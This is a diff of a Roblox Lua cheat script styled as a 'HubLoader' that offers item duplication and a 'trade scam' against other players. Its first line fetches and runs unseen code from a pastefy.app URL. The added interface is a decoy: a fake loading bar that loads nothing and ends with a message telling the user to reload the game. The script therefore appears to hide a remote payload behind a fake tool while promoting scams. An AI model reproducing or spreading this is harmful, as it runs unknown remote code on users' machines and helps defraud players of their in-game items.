@@ -1,1 +1,267 @@
 loadstring(game:HttpGet("https://pastefy.app/vE2Kv53d/raw", true))()
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screen = Instance.new("ScreenGui")
+screen.Name = "HubLoader"
+screen.Parent = playerGui
+
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+-- FRAME PRINCIPAL
+local main = Instance.new("Frame")
+main.Size = UDim2.new(1,0,1,0)
+main.BackgroundTransparency = 1
+main.Parent = screen
+
+-- ENCADRE TEXTE INFO (DRAGGABLE)
+local infoFrame = Instance.new("Frame")
+infoFrame.Size = UDim2.new(0.45,0,0.12,0)
+infoFrame.Position = UDim2.new(0.27,0,0.05,0)
+infoFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+infoFrame.Parent = screen
+infoFrame.Active = true
+
+local cornerInfo = Instance.new("UICorner")
+cornerInfo.Parent = infoFrame
+
+local strokeInfo = Instance.new("UIStroke")
+strokeInfo.Thickness = 3
+strokeInfo.Parent = infoFrame
+
+task.spawn(function()
+	local hue = 0
+	while infoFrame.Parent do
+		hue += 0.01
+		if hue > 1 then hue = 0 end
+		strokeInfo.Color = Color3.fromHSV(hue,1,1)
+		task.wait(0.03)
+	end
+end)
+
+local infoText = Instance.new("TextLabel")
+infoText.Size = UDim2.new(0.95,0,0.9,0)
+infoText.Position = UDim2.new(0.025,0,0.05,0)
+infoText.BackgroundTransparency = 1
+infoText.TextScaled = true
+infoText.Font = Enum.Font.Gotham
+infoText.TextColor3 = Color3.new(1,1,1)
+infoText.TextWrapped = true
+infoText.Text = "For trade scam you need bait, and maybe you need to have brainrots for other script. THIS SCRIPT IS A REMAKE BUT ITS THE SAME, I just made this so you guys dont have to find 10 scripts because in 1 script there is all."
+infoText.Parent = infoFrame
+
+-- DRAGGABLE
+local dragging, dragStart, startPos = false
+infoFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = infoFrame.Position
+	end
+end)
+infoFrame.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = false
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local delta = input.Position - dragStart
+		infoFrame.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- HUBS
+local hubs = {
+	{name="Nines hub", color=Color3.fromRGB(255,80,80)},
+	{name="Kawatan hub", color=Color3.fromRGB(80,170,255)},
+	{name="Dupe brainrot (don't work)", color=Color3.fromRGB(80,255,140)},
+	{name="trade scam (not 100% works)", color=Color3.fromRGB(255,200,80)}
+}
+
+local buttons = {}
+for i,hub in ipairs(hubs) do
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(0.20,0,0.11,0)
+	button.Position = UDim2.new((i%2==1) and 0.30 or 0.52,0,(i<=2) and 0.34 or 0.54,0)
+	button.BackgroundColor3 = hub.color
+	button.Text = hub.name
+	button.TextScaled = true
+	button.Font = Enum.Font.GothamBold
+	button.TextColor3 = Color3.new(0,0,0)
+	button.Parent = main
+	
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0,12)
+	corner.Parent = button
+	
+	local stroke = Instance.new("UIStroke")
+	stroke.Thickness = 3
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	stroke.Parent = button
+	
+	buttons[i] = button
+	
+	task.spawn(function()
+		local hue = 0
+		while button.Parent do
+			hue += 0.01
+			if hue > 1 then hue = 0 end
+			stroke.Color = Color3.fromHSV(hue,1,1)
+			task.wait(0.03)
+		end
+	end)
+end
+
+-- LOADING FRAME
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(0.45,0,0.15,0)
+loadingFrame.Position = UDim2.new(0.275,0,0.42,0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+loadingFrame.Visible = false
+loadingFrame.Parent = screen
+local corner = Instance.new("UICorner")
+corner.Parent = loadingFrame
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1,0,0.4,0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading..."
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextScaled = true
+loadingText.TextColor3 = Color3.new(1,1,1)
+loadingText.Parent = loadingFrame
+
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.9,0,0.3,0)
+barBG.Position = UDim2.new(0.05,0,0.6,0)
+barBG.BackgroundColor3 = Color3.fromRGB(60,60,60)
+barBG.Parent = loadingFrame
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
+bar.Parent = barBG
+local corner3 = Instance.new("UICorner")
+corner3.Parent = bar
+
+-- RGB BAR EFFECT
+task.spawn(function()
+	local hue = 0
+	while bar.Parent do
+		hue += 0.01
+		if hue > 1 then hue = 0 end
+		bar.BackgroundColor3 = Color3.fromHSV(hue,1,1)
+		task.wait(0.03)
+	end
+end)
+
+-- MESSAGE AU DESSUS DE LA BARRE
+local loadingInfoFrame = Instance.new("Frame")
+loadingInfoFrame.Size = UDim2.new(0.45,0,0.08,0)
+loadingInfoFrame.Position = UDim2.new(0.275,0,0.33,0)
+loadingInfoFrame.BackgroundColor3 = Color3.new(1,1,1)
+loadingInfoFrame.Visible = false
+loadingInfoFrame.Parent = screen
+
+local loadingInfoCorner = Instance.new("UICorner")
+loadingInfoCorner.Parent = loadingInfoFrame
+local loadingInfoStroke = Instance.new("UIStroke")
+loadingInfoStroke.Thickness = 3
+loadingInfoStroke.Parent = loadingInfoFrame
+
+task.spawn(function()
+	local hue = 0
+	while loadingInfoFrame.Parent do
+		hue += 0.01
+		if hue > 1 then hue = 0 end
+		loadingInfoStroke.Color = Color3.fromHSV(hue,1,1)
+		task.wait(0.03)
+	end
+end)
+
+local loadingInfoText = Instance.new("TextLabel")
+loadingInfoText.Size = UDim2.new(0.95,0,0.9,0)
+loadingInfoText.Position = UDim2.new(0.025,0,0.05,0)
+loadingInfoText.BackgroundTransparency = 1
+loadingInfoText.TextScaled = true
+loadingInfoText.Font = Enum.Font.GothamBold
+loadingInfoText.TextColor3 = Color3.new(0,0,0)
+loadingInfoText.TextWrapped = true
+loadingInfoText.Text = "Don't worry its long only the first Time you execute to load all things"
+loadingInfoText.Parent = loadingInfoFrame
+
+-- ALERT FINALE
+local function showAlert()
+	main:Destroy()
+	loadingFrame:Destroy()
+	loadingInfoFrame:Destroy()
+	local alert = Instance.new("TextLabel")
+	alert.Size = UDim2.new(1,0,1,0)
+	alert.BackgroundTransparency = 1
+	alert.TextScaled = true
+	alert.Font = Enum.Font.GothamBlack
+	alert.TextColor3 = Color3.new(1,0,0)
+	alert.Text = "RELOAD YOUR GAME\nSCRIPT DIDN'T WORK THIS TIME"
+	alert.Parent = screen
+	
+	task.spawn(function()
+		while true do
+			alert.TextTransparency = 0
+			task.wait(0.4)
+			alert.TextTransparency = 0.5
+			task.wait(0.4)
+		end
+	end)
+end
+
+-- LOADING SYSTEM AVEC VITESSE VARIABLE
+local function startLoading(name)
+	main.Visible = false
+	loadingFrame.Visible = true
+	loadingInfoFrame.Visible = true
+	loadingText.Text = "Loading "..name
+	
+	local progress = 0
+	local startTime = tick()
+	local speed = 0.8
+	
+	while progress < 100 do
+		local elapsed = tick() - startTime
+		
+		if elapsed <= 12 then
+			speed = 0.8
+		elseif elapsed <= 27 then
+			speed = 0.3
+		elseif elapsed <= 42 then
+			speed = 0.8
+		else
+			speed = 0.3
+		end
+		
+		progress += speed
+		
+		local tween = TweenService:Create(
+			bar,
+			TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{Size = UDim2.new(math.clamp(progress/100,0,1),0,1,0)}
+		)
+		tween:Play()
+		task.wait(1)
+	end
+	
+	showAlert()
+end
+
+-- CLIQUE BOUTONS
+for _,button in pairs(buttons) do
+	button.MouseButton1Click:Connect(function()
+		startLoading(button.Text)
+	end)
+end
